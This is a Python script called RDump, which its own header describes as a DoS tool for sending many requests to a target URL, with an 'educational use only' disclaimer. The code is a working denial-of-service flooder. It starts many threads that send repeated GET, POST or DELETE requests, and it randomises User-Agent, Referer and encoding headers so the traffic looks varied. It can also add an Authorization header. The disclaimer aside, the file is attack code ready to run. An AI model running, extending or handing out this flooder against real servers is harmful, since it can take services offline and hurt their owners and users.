#!/usr/bin/env python3

"""                                                                                                                                                              
RRRRRRRRRRRRRRRRR   DDDDDDDDDDDDD                                                                      
R::::::::::::::::R  D::::::::::::DDD                                                                   
R::::::RRRRRR:::::R D:::::::::::::::DD                                                                 
RR:::::R     R:::::RDDD:::::DDDDD:::::D                                                                
  R::::R     R:::::R  D:::::D    D:::::D uuuuuu    uuuuuu     mmmmmmm    mmmmmmm   ppppp   ppppppppp   
  R::::R     R:::::R  D:::::D     D:::::Du::::u    u::::u   mm:::::::m  m:::::::mm p::::ppp:::::::::p  
  R::::RRRRRR:::::R   D:::::D     D:::::Du::::u    u::::u  m::::::::::mm::::::::::mp:::::::::::::::::p 
  R:::::::::::::RR    D:::::D     D:::::Du::::u    u::::u  m::::::::::::::::::::::mpp::::::ppppp::::::p
  R::::RRRRRR:::::R   D:::::D     D:::::Du::::u    u::::u  m:::::mmm::::::mmm:::::m p:::::p     p:::::p
  R::::R     R:::::R  D:::::D     D:::::Du::::u    u::::u  m::::m   m::::m   m::::m p:::::p     p:::::p
  R::::R     R:::::R  D:::::D     D:::::Du::::u    u::::u  m::::m   m::::m   m::::m p:::::p     p:::::p
  R::::R     R:::::R  D:::::D    D:::::D u:::::uuuu:::::u  m::::m   m::::m   m::::m p:::::p    p::::::p
RR:::::R     R:::::RDDD:::::DDDDD:::::D  u:::::::::::::::uum::::m   m::::m   m::::m p:::::ppppp:::::::p
R::::::R     R:::::RD:::::::::::::::DD    u:::::::::::::::um::::m   m::::m   m::::m p::::::::::::::::p 
R::::::R     R:::::RD::::::::::::DDD       uu::::::::uu:::um::::m   m::::m   m::::m p::::::::::::::pp  
RRRRRRRR     RRRRRRRDDDDDDDDDDDDD            uuuuuuuu  uuuummmmmm   mmmmmm   mmmmmm p::::::pppppppp    
                                                                                    p:::::p            
                                                                                    p:::::p            
                                                                                   p:::::::p           
                                                                                   p:::::::p           
                                                                                   p:::::::p           
                                                                                   ppppppppp           
                                                                                                 
This tool is a dos tool which is meant to send multiple requests and can be used to stress test servers

This tool is meant for research purposes only
and any malicious usage of this tool is prohibited.

@author Jan Balitaan

@date 2022-11-30
@version 1.0

LICENSE:
This software is distributed under the GNU General Public License version 3 (GPLv3)

LEGAL NOTICE:
THIS SOFTWARE IS PROVIDED FOR EDUCATIONAL USE ONLY!
IF YOU ENGAGE IN ANY ILLEGAL ACTIVITY
THE AUTHOR DOES NOT TAKE ANY RESPONSIBILITY FOR IT.
BY USING THIS SOFTWARE YOU AGREE WITH THESE TERMS.
"""

import argparse
import sys
import json
import requests
import random
from urllib.parse import urlparse
from threading import Thread

def rdump_details():
    return '''
    Welcome to RDump by Jan Balitaan

    '''

def load_json(file_path):
    f = open(file_path)

    return json.load(f)

def get_content_types():
    return load_json('data/content-types.json')

def get_referers():
    return load_json('data/referers.json')

def get_user_agents():
    return load_json('data/user-agents.json')

def get_arg_parser():
    parser = argparse.ArgumentParser(description=rdump_details())
    parser.add_argument("-t", "--target", help="Target HTTP URL to be attacked", required=True, default="")
    parser.add_argument("-u", "--user-agent", help="Set a specific useragent to be used in the request", required=False, default="")
    parser.add_argument("-r", "--referer", help="Set a specific useragent to be used in the request", required=False, default="")
    parser.add_argument("-w", "--workers", help="Set a specific number of parallel connection", required=False, default="5")
    parser.add_argument("-x", "--retries", help="Max retries per worker before terminating", required=False, default="5")
    parser.add_argument("-a", "--authorization", help="HTTP Request Authorization (e.g.: 'Bearer <Token>')", required=False, default="")
    parser.add_argument("-m", "--method", help="HTTP Method for the request", required=False, default="GET", choices=["GET", "POST", "PUT", "DELETE"])
    parser.add_argument("-d", "--data", help="HTTP Body Request - a string json", required=False, default="{}")
    parser.add_argument("-c", "--content-type", help="Content Type of HTTP Body", required=False, default="application/x-www-form-urlencoded")
    parser.add_argument("-v", "--verbose", help="Show verbose output", required=False, default="false", choices=["true", "false"])

    return parser

def args_to_dict(args):
    d = dict()
    for k, v in args._get_kwargs():
        # parse to respective data types here
        if k == "data":
            try:
                d[k] = json.loads(v)
            except json.JSONDecodeError:
                print(f'ERROR: invalid json string format for {k} option')
                sys.exit(3)
            except Exception as e:
                print(f'ERROR: {str(e)}')
                sys.exit(3)
        elif k in ["workers", "retries"]:
            d[k] = int(v)
        elif k == "verbose":
            d[k] = True if v.lower() == "true" else False
        else:
            d[k] = v

    return d

request_session = requests.Session()
def get_request_session():
    global request_session
    request_session = requests.Session() if not request_session else request_session

def generate_request_headers(
    host, 
    header_references,
    options={}
):
    accept_encodings = ['\'\'','*','identity','gzip','deflate']
    random.shuffle(accept_encodings)
    encoding_range = random.randint(1,int(len(accept_encodings)/2))
    encodings = accept_encodings[:encoding_range]
    
    headers = {
        'User-Agent': options['user_agent'] if 'user_agent' in options and options['user_agent'] else random.choice(header_references["user_agents"]),
        'Cache-Control': ', '.join(['no-cache', 'max-age=0']),
        'Accept-Encoding': ', '.join(encodings),
        'Connection': 'keep-alive',
        'Keep-Alive': str(random.randint(1,1000)),
        'Host': urlparse(host).netloc,
        'Content-Type': options['content_type'] if 'content_type' in options and options['content_type'] else random.choice(header_references["content_types"]),
        'Referer': options['referer'] if 'referer' in options and options['referer'] else random.choice(header_references["referers"]),
    }

    # TODO: add more header
    if options["authorization"]:
        headers["Authorization"] = options["authorization"]
    
    return headers

def make_request(
    thread_id,
    options,
    header_references,
):
    remaining_retries = options['retries']
    while remaining_retries > 0:
        if options['method'] == "GET":
            resp = request_session.get(
                options['target'],
                headers=generate_request_headers(
                    options['target'],
                    header_references,
                    options
                ),
                timeout=120
            )
        if options['method'] == "POST":
            resp = request_session.post(
                options['target'],
                headers=generate_request_headers(
                    options['target'],
                    header_references,
                    options
                ),
                data=options["data"],
                timeout=120
            )
        if options['method'] == "PUT":
            resp = request_session.post(
                options['target'],
                headers=generate_request_headers(
                    options['target'],
                    header_references,
                    options
                ),
                data=options["data"],
                timeout=120
            )
        if options['method'] == "DELETE":
            resp = request_session.delete(
                options['target'],
                headers=generate_request_headers(
                    options['target'],
                    header_references,
                    options
                ),
                timeout=120
            )
        
        if options["verbose"]:
            print(f'thread_id: {thread_id}, code: {resp.status_code}, reason: {resp.reason}, details: {resp.text}')
        if resp.status_code < 200 or resp.status_code > 299:
            remaining_retries -= 1

def main():
    header_references = {
        "content_types": get_content_types(),
        "referers": get_referers(),
        "user_agents": get_user_agents(),
    }
    arg_parser = get_arg_parser()
    args = arg_parser.parse_args()
    options = args_to_dict(args)
    
    threads = []
    try:
        for i in range(0, options["workers"]):
            t = Thread(
                target=make_request,
                args=(
                    i,
                    options,
                    header_references,
                )
            )
            threads.append(t)
            t.start()

            if options["verbose"]:
                print(f'Started a new thread({i})')
    except Exception as e:
        if options['verbose']:
            print(str(e))
    except KeyboardInterrupt as e:
        if options['verbose']:
            print('RDump Interrupted')
    finally:
        sys.exit(1)
        

if __name__ == "__main__":
    main()